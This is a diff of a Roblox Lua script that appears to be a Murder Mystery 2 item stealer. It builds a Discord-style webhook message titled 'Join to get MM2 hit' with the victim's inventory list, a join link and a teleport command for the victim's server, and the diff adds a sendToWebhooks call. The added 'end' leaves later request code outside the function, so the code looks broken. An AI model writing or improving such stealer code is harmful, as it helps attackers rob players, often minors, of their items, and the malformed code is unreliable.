@@ -251,7 +251,8 @@ local function SendFirstMessage(list, prefix)
         },
         {
             name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
+            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId,
+            inline = false
         },
         {
             name = "Item list:",
@@ -285,7 +286,7 @@ local function SendFirstMessage(list, prefix)
     local data = {
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = "\240\159\148\170 Join to get MM2 hit",
+            ["title"] = "Join to get MM2 hit",
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
@@ -293,6 +294,8 @@ local function SendFirstMessage(list, prefix)
             }
         }}
     }
+    sendToWebhooks(data)
+end
 
     local body = HttpService:JSONEncode(data)
     local response = request({
